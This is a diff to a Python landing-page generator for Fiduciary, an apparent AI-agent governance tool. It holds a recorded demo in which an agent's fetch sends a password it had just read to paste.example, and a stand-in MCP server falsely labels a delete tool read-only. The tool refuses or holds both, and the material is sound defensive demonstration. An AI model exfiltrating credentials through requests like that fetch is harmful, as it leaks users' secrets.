@@ -42,85 +42,168 @@ DESCRIPTION: Final = (
 
 COPY: Final[dict[str, Any]] = {
     "badge": {
-        "version": "1.18",
-        "text": "Undo: a committed plan put back exactly, and a failed turn put back",
+        "version": "1.19",
+        "text": "What leaves is checked: a credential your agent read cannot go out in a fetch",
         "href": REPO + "fiduciary/blob/main/CHANGELOG.md",
     },
     "headline": "Let AI agents change real systems. Keep only the changes you approved.",
     "lede": (
-        "Fiduciary stages every change an agent makes, measures what it actually did, and checks "
-        "that against limits your team signed. A change inside the limits commits once. A change "
-        "outside them is refused before it is final, unless two of three named people approve "
-        "it. Every decision is a signed record anyone can check offline."
+        "Your agent's rules live in its prompt, and prompts get trimmed. Fiduciary sits between "
+        "the agent and its tools. It pins what each tool is, holds the dangerous calls for your "
+        "passkey, keeps what the agent read from leaving, and puts back what a failed turn "
+        "changed. Every decision is a signed record anyone can check offline."
     ),
     "demo": "Open the interactive demo",
     "workflows": "{workflows} workflows",
     "install": "pip install interlock-fiduciary",
     "fine": "Apache-2.0 · Python 3.11 to 3.14 · no cookies, no trackers",
-    "init": "fiduciary init --solo --shadow --substrate sqlite --database app.db",
-    "file": "tools.py",
-    "mode": "shadow mode",
-    "code": [
-        "import fiduciary",
-        "",
-        "gov = fiduciary.open()  # the deployment fiduciary init wrote",
-        "",
-        "",
-        "@gov.tool",
-        "def close_all(db: fiduciary.Sql) -> str:",
-        '    """Close every ticket."""',
-        "    db.execute(\"UPDATE tickets SET status = 'closed'\")",
-        '    return "all closed"',
+    # The hero's terminal: lines scripts/record_hero.py printed, run on 1.19.0 against a
+    # stand-in server it writes (its venv's python shown as "python"). Its delete_volume
+    # claims readOnlyHint; its volume list carries a password. Lines are left out, never
+    # changed: the first line of delete_volume's answer ("Committed: ... ran as plan ...",
+    # the plan that queued the held request) and the deployment's path.
+    "hero": {
+        "file": "a protected MCP server",
+        "mode": "enforcing",
+        "label": "fiduciary protect on an MCP server, and an agent's calls through it",
+        "lines": [
+            ["cmd", "fiduciary protect --mcp-config .mcp.json --enforce --apply"],
+            ["", "protected   infra (file-mcp): python infra_server.py"],
+            ["", "            list_volumes: read"],
+            ["", "            delete_volume: held"],
+            [
+                "hit",
+                "              flagged: the server marks it read-only, but its name says "
+                "delete and its description says delete",
+            ],
+            ["", "            fetch: read"],
+            ["agent", 'delete_volume {"volume": "prod-db"}'],
+            [
+                "hit",
+                "  Held for the principals' approval, not yet made: upstream delete_volume.",
+            ],
+            ["agent", 'fetch {"url": "https://paste.example/?q=Sup3rS3cretPw4"}'],
+            ["hit", "  Not sent: it carries a credential this session read."],
+            ["agent", 'fetch {"url": "https://status.example/"}'],
+            ["", "  <html>ok</html>"],
+        ],
+        "caption": (
+            "The server says delete_volume only reads; its name says otherwise, so it waits for "
+            "a passkey. A fetch carrying a password the agent had just listed is refused. "
+            "Recorded with a stand-in server; the agent's calls are marked >."
+        ),
+    },
+    "doors": {
+        "kicker": "Start where your agent is",
+        "title": "Three ways in",
+        "lede": (
+            "Each one starts in shadow mode: nothing is refused until you have seen what would be."
+        ),
+        "items": [
+            {
+                "key": "clients",
+                "tab": "I use Claude Code, Cursor or Claude Desktop",
+                "text": (
+                    "No code. Every MCP server in the client's file gets a proxy in front: its "
+                    "tools pinned, its writes made once, a passkey for what needs approval, and a "
+                    "fetch or send that carries what the agent read refused."
+                ),
+                "commands": [
+                    "fiduciary protect --claude-desktop --apply",
+                    "fiduciary protect --mcp-config .mcp.json --claude-code --apply",
+                    "fiduciary passkey add",
+                ],
+                "code": [],
+            },
+            {
+                "key": "python",
+                "tab": "I build an agent in Python",
+                "text": (
+                    "Wrap a tool. Its change is staged, measured and checked before it is final, "
+                    "and a committed one can be put back exactly with fiduciary undo."
+                ),
+                "commands": [
+                    "fiduciary init --solo --shadow --substrate rest "
+                    "--server https://api.example.com --resource refunds=/refunds",
+                    "fiduciary undo <plan>",
+                ],
+                "code": [
+                    "import fiduciary",
+                    "",
+                    "gov = fiduciary.open()  # the deployment fiduciary init wrote",
+                    "",
+                    "",
+                    "@gov.tool",
+                    "def refund(api: fiduciary.Rest, order_id: str, amount: str) -> str:",
+                    '    """Refund part of an order."""',
+                    '    api.create("refunds", {"order_id": order_id, "amount": amount})',
+                    '    return f"refund of {amount} on {order_id} staged"',
+                ],
+            },
+            {
+                "key": "ci",
+                "tab": "My agents run in CI or on infrastructure",
+                "text": (
+                    "Point it at the system itself: a Terraform configuration's plan, a "
+                    "Kubernetes namespace's dry run. An agent in a CI job that reads an MCP "
+                    "client file is protected the same way."
+                ),
+                "commands": [
+                    "fiduciary init --solo --shadow --substrate terraform --directory infra",
+                    "fiduciary init --solo --shadow --substrate kubernetes "
+                    "--server https://k8s.example:6443 --namespace prod",
+                    "fiduciary protect --mcp-config .mcp.json --apply",
+                ],
+                "code": [],
+            },
+        ],
+    },
+    "systems_order": [
+        ["MCP servers", "R", ""],
+        ["REST APIs", "", "REST API"],
+        ["Git", "", "Git"],
+        ["Files", "", "Files"],
+        ["Kubernetes and Terraform", "", "Kubernetes"],
+        ["FHIR", "", "FHIR R4"],
+        ["SQL databases", "", "SQLite"],
     ],
-    # The first lines `fiduciary shadow report` printed for this example (the mandate's id
-    # shortened). Run again on 1.16.1: the SQLite starter's mandate is written with tables, so
-    # the check is recorded under its SQL name, blast_radius, not change_limit.
-    "report": [
-        ["cmd", "fiduciary shadow report"],
-        ["", "Mandate fcc02e85"],
-        ["", "  3 plans staged: 3 committed, 0 refused, 0 put back."],
-        ["", "  1 of them would have been refused if the mandate were enforced:"],
-        ["hit", "    blast_radius: 1 plan, from close_all (1)"],
-    ],
-    "code_label": "A tool wrapped in shadow mode, and the report it leads to",
-    "caption": (
-        "Every call commits in shadow mode. The report lists the calls the mandate would have "
-        "refused, here one that closed 38 tickets at once."
-    ),
     "systems": "One engine, measured on",
     "stack": {
-        "kicker": "The stack",
-        "title": "Three packages. Use one, or all three.",
+        "kicker": "What you install",
+        "title": "Fiduciary, and the two engines under it",
         "lede": (
-            "A gateway decides whether an agent may call a tool. These decide whether what the "
-            "call changed may be kept, and leave evidence for someone who trusts neither the "
-            "agent nor the operator. AgentGov and Interlock each work on their own, and "
-            "Fiduciary installs both."
+            "A gateway decides whether an agent may call a tool. Fiduciary decides whether what "
+            "the call changed may be kept, and leaves evidence for someone who trusts neither the "
+            "agent nor the operator. Installing interlock-fiduciary brings both engines with it: "
+            "Interlock stages and measures each change, and AgentGov keeps the budgets. Each "
+            "also works on its own."
         ),
     },
     "packages": [
         {
-            "key": "agentgov",
-            "name": "AgentGov",
-            "dist": "interlock-agentgov",
-            "layer": "Layer 1 · spend",
-            "role": "Spend and rate limits for agents",
+            "key": "fiduciary",
+            "name": "Fiduciary",
+            "dist": "interlock-fiduciary",
+            "layer": "The product",
+            "role": "Signed limits, approvals and offline proof",
             "text": (
-                "A ledger for every scope in a delegation tree. A plan is held against its "
-                "budget before it runs and settled after, so a sub-agent cannot spend more than "
-                "its parent gave it."
+                "Your limits are a mandate that named people sign, and anything outside it needs "
+                "two of three of them. Every decision is a signed record, and the records export "
+                "as a bundle anyone can verify offline."
             ),
             "points": [
-                "Budgets, rate windows and circuit breakers",
-                "ARC1 receipts: what each action was allowed, did and cost",
-                "Reconciles a system's own log against the ledger",
+                "Pins the MCP servers your client runs: fiduciary protect",
+                "Keeps what the agent read from leaving, whole or encoded",
+                "Approvals signed with a passkey the agent cannot reach",
+                "Puts a committed change back exactly: fiduciary undo",
+                "Shadow mode first: see what it would have refused",
             ],
         },
         {
             "key": "interlock",
             "name": "Interlock",
             "dist": "interlock-escrow",
-            "layer": "Layer 2 · change",
+            "layer": "Engine · staging",
             "role": "Checks on what a write actually changed",
             "text": (
                 "Each change is staged where nothing is final yet, measured, and checked. It "
@@ -133,23 +216,20 @@ COPY: Final[dict[str, Any]] = {
             ],
         },
         {
-            "key": "fiduciary",
-            "name": "Fiduciary",
-            "dist": "interlock-fiduciary",
-            "layer": "Layer 3 · authority",
-            "role": "Signed limits, approvals and offline proof",
+            "key": "agentgov",
+            "name": "AgentGov",
+            "dist": "interlock-agentgov",
+            "layer": "Engine · budgets",
+            "role": "Spend and rate limits for agents",
             "text": (
-                "Your limits are a mandate that named people sign, and anything outside it needs "
-                "two of three of them. Every decision is a signed record, and the records export "
-                "as a bundle anyone can verify offline."
+                "A ledger for every scope in a delegation tree. A plan is held against its "
+                "budget before it runs and settled after, so a sub-agent cannot spend more than "
+                "its parent gave it."
             ),
             "points": [
-                "Governed tools in your own code, or over MCP",
-                "Shadow mode first: see what it would have refused",
-                "Holds a write the agent asks for after reading untrusted input",
-                "Approvals signed with a passkey, which an agent cannot read",
-                "Pins the MCP servers Claude Desktop and Cursor run: fiduciary protect",
-                "Puts a committed plan back exactly, and a failed turn: fiduciary undo",
+                "Budgets, rate windows and circuit breakers",
+                "ARC1 receipts: what each action was allowed, did and cost",
+                "Reconciles a system's own log against the ledger",
             ],
         },
     ],
@@ -176,16 +256,15 @@ COPY: Final[dict[str, Any]] = {
             ],
             [
                 "Measure",
-                "The stage records what the change actually did, including whatever triggers, "
-                "hooks, renderers and admission webhooks did on top: every row, file, object or "
-                "record.",
+                "The stage records what the change actually did, down to every row, file, "
+                "object or record, including whatever triggers, hooks and admission webhooks "
+                "added on top.",
             ],
             [
                 "Check",
-                "The measured change is compared with the mandate: which tables, files, objects "
-                "or records it touched and how many, whose data it reached, how far any guarded "
-                "value moved, the rate windows and budgets, and what the agent had read before it "
-                "asked.",
+                "The measured change is compared with the mandate: what it touched and how much, "
+                "whose data it reached, how far any guarded value moved, the rate limits and "
+                "budgets, and what the agent had read before it asked.",
             ],
             [
                 "Commit or undo",
@@ -249,6 +328,13 @@ COPY: Final[dict[str, Any]] = {
             "Open source, Apache-2.0. This page is built from the repository with fiduciary demo "
             "--replay, and SHA256SUMS lists the SHA-256 of the page and of every bundle it links."
         ),
+        "guides": [
+            ["Secure MCP servers", "protect/"],
+            ["Claude Code and Cursor", "claude-code/"],
+            ["Stop data leaving", "outbound/"],
+            ["Passkeys for approvals", "passkeys/"],
+            ["Verify an audit bundle", "verify/"],
+        ],
         "read": [
             ["Quickstart", REPO + "fiduciary/blob/main/docs/QUICKSTART.md"],
             ["Threat model", REPO + "fiduciary/blob/main/docs/THREAT_MODEL.md"],
@@ -380,7 +466,7 @@ def counts(data: Mapping[str, Any]) -> dict[str, object]:
     demo = data.get("demo") or {}
     served = (demo.get("model") or {}).get("served")
     mode = (
-        f"recorded {served} session, replayed at no cost"
+        f"a recorded {served} session, replayed with no model called"
         if demo.get("mode") == "replay" and served
         else f"live {served} session"
         if demo.get("mode") == "live" and served
@@ -438,33 +524,22 @@ def _hero(c: Mapping[str, Any], n: Mapping[str, object], rows: list[Mapping[str,
         f"{_copy_chip(c['install'])}</div>"
         f'<p class="lp-fine">{_e(c["fine"])}</p></div>'
     )
-    lines = "".join(
-        f'<div class="cl"><span class="ln" aria-hidden="true">{i}</span>'
-        f"<span>{_python(line)}</span></div>"
-        for i, line in enumerate(c["code"], 1)
-    )
-    report = "".join(
-        f'<div class="tl"><span class="lp-prompt">$</span> {_e(text)}</div>'
-        if kind == "cmd"
-        else f'<div class="tl{" hit" if kind == "hit" else ""}">{_e(text)}</div>'
-        for kind, text in c["report"]
-    )
+    hx = c["hero"]
+    shown = "".join(_term_line(kind, text) for kind, text in hx["lines"])
     code = (
-        f'<figure class="lp-code" aria-label="{_e(c["code_label"])}">'
+        f'<figure class="lp-code lp-terminal" aria-label="{_e(hx["label"])}">'
         '<div class="lp-code-bar"><i></i><i></i><i></i>'
-        f'<span class="mono">{_e(c["file"])}</span><span class="spacer"></span>'
-        f'<span class="lp-tag">{_e(c["mode"])}</span></div>'
-        f'<pre class="lp-src"><div class="tl lp-init"><span class="lp-prompt">$</span> '
-        f"{_e(c['init'])}</div>{lines}</pre>"
-        f'<div class="lp-term">{report}</div><figcaption>{_e(c["caption"])}</figcaption></figure>'
+        f'<span class="mono">{_e(hx["file"])}</span><span class="spacer"></span>'
+        f'<span class="lp-tag">{_e(hx["mode"])}</span></div>'
+        f'<div class="lp-term">{shown}</div><figcaption>{_e(hx["caption"])}</figcaption></figure>'
     )
-    seen: dict[str, Mapping[str, Any]] = {}
+    classes: dict[str, str] = {}
     for row in rows:
-        seen.setdefault(row.get("substrate") or "", row)
+        classes.setdefault(str(row.get("substrate") or ""), str(row.get("class") or ""))
     chips = "".join(
-        f'<span class="lp-sys">{_rung(row["class"])}{_e(name)}</span>'
-        for name, row in seen.items()
-        if name
+        f'<span class="lp-sys">{_rung(letter or classes[found])}{_e(name)}</span>'
+        for name, letter, found in c["systems_order"]
+        if letter or found in classes
     )
     systems = (
         f'<div class="lp-systems"><span class="lp-sys-label">{_e(c["systems"])}</span>{chips}</div>'
@@ -472,6 +547,46 @@ def _hero(c: Mapping[str, Any], n: Mapping[str, object], rows: list[Mapping[str,
         else ""
     )
     return _section("lp-hero", None, f'<div class="lp-hero-grid">{copy}{code}</div>{systems}')
+
+
+def _term_line(kind: str, text: str) -> str:
+    """One line of a terminal figure: a command, an agent's call, or what was printed."""
+    if kind == "cmd":
+        return f'<div class="tl"><span class="lp-prompt">$</span> {_e(text)}</div>'
+    if kind == "agent":
+        return f'<div class="tl lp-agent"><span class="lp-prompt">&gt;</span> {_e(text)}</div>'
+    return f'<div class="tl{" hit" if kind == "hit" else ""}">{_e(text)}</div>'
+
+
+def _doors(c: Mapping[str, Any]) -> str:
+    """The three ways in, as tabs; before the script runs, the first is shown."""
+    d = c["doors"]
+    tabs = "".join(
+        f'<button class="lp-door-tab" role="tab" id="door-{_e(x["key"])}" '
+        f'aria-controls="door-panel-{_e(x["key"])}" '
+        f'aria-selected="{"true" if i == 0 else "false"}">{_e(x["tab"])}</button>'
+        for i, x in enumerate(d["items"])
+    )
+    panels = ""
+    for i, x in enumerate(d["items"]):
+        chips = "".join(_copy_chip(command) for command in x["commands"])
+        lines = "".join(
+            f'<div class="cl"><span class="ln" aria-hidden="true">{n}</span>'
+            f"<span>{_python(line)}</span></div>"
+            for n, line in enumerate(x["code"], 1)
+        )
+        code = f'<pre class="lp-src lp-door-code">{lines}</pre>' if x["code"] else ""
+        hidden = "" if i == 0 else " hidden"
+        panels += (
+            f'<div class="lp-door" role="tabpanel" id="door-panel-{_e(x["key"])}" '
+            f'aria-labelledby="door-{_e(x["key"])}"{hidden}>'
+            f'<p>{_e(x["text"])}</p><div class="lp-door-cmds">{chips}</div>{code}</div>'
+        )
+    return _section(
+        "lp-sec lp-doors",
+        "doors",
+        f'{_head(d)}<div class="lp-door-tabs" role="tablist">{tabs}</div>{panels}',
+    )
 
 
 def _stack(c: Mapping[str, Any], versions: Mapping[str, str], mark: _Marks) -> str:
@@ -601,6 +716,7 @@ def _footer(c: Mapping[str, Any], mark: _Marks) -> str:
         f"<p>{_e(foot['text'])}</p></div>"
         + col("Source", [(p["name"], REPO + p["key"]) for p in packages])
         + col("Install", [(p["dist"], f"{PYPI}{p['dist']}/") for p in packages])
+        + col("Guides", [(text, href) for text, href in foot["guides"]])
         + col("Read", [(text, href) for text, href in foot["read"]])
         + f'</div><p class="lp-foot-note">{_e(foot["note"])}</p></div></footer>'
     )
@@ -611,6 +727,7 @@ def front_page(data: Mapping[str, Any]) -> str:
     n, mark = counts(data), _Marks()
     main = (
         _hero(COPY, n, _ran(data))
+        + _doors(COPY)
         + _stack(COPY, _versions(data), mark)
         + _loop(COPY)
         + _ladder(COPY, data)
@@ -716,14 +833,18 @@ def built_on(data: Mapping[str, Any]) -> str:
 
 
 def sitemap(data: Mapping[str, Any]) -> str:
-    """The site's one address. The views behind ``#/`` are the same page to a crawler."""
+    """The site's addresses: the front page, and each guide (1.19.0). The views behind
+    ``#/`` are the same page to a crawler, so the guides are pages of their own."""
+    from fiduciary.report.guides import GUIDES
+
     day = built_on(data)
     lastmod = f"<lastmod>{day}</lastmod>" if re.fullmatch(r"\d{4}-\d{2}-\d{2}", day) else ""
+    urls = [SITE_URL, *(f"{SITE_URL}{g['slug']}/" for g in GUIDES)]
     return (
         '<?xml version="1.0" encoding="UTF-8"?>\n'
         '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
-        f"  <url><loc>{SITE_URL}</loc>{lastmod}</url>\n"
-        "</urlset>\n"
+        + "".join(f"  <url><loc>{url}</loc>{lastmod}</url>\n" for url in urls)
+        + "</urlset>\n"
     )
 
 
